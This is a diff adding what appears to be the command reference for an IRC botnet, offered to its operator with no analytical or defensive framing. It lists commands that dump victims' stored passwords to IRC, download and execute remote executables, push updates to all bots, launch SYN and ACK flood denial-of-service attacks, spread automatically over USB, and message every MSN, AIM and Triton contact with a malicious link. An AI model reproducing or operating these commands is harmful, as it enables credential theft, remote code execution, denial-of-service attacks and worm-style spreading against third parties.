@@ -1,0 +1,31 @@
+Bot commands:
+
+.login hello        // Logs you into your bots
+.logout             // think i disabled this?
+
+.join #chan
+.part #chan
+
+.gone               // Removes the bot forever!
+.pstore             // This dumps all passwords to you on irc
+.visit http://link.com/page.php   // visit page
+
+.download http://somesite.com/file.exe C:\windows\somewhere.exe 1/0     // Download and or execute (1 = execute | 0 = not)
+.update http://site.com/file.exe 1                                      // 1 can be any number, this will update all your bots to new ones.
+
+.ddos.syn ip.ip.ip.ip port timefor                                      // Will synflood a target for so long
+.ddos.ack ip.ip.ip.ip port timefor                                      // Will sck flood
+.ddos.supersyn ip.ip.ip.ip port timefor                                 // POWERFULL SUPERSYN FLOOD
+
+~~SPREADING~~
+
+Automaticly spreads via USB
+
+.msn.msg <some message here> <your site & phpfile>                      // message to all contacts on msn
+.msn.stop
+
+.aim.msg <some message here> <your site & phpfile>                      // message to all contacts on aim
+.aim.stop
+
+.triton.msg <some message here> <your site & phpfile>                   // message to all contacts on triton
+.triton.stop
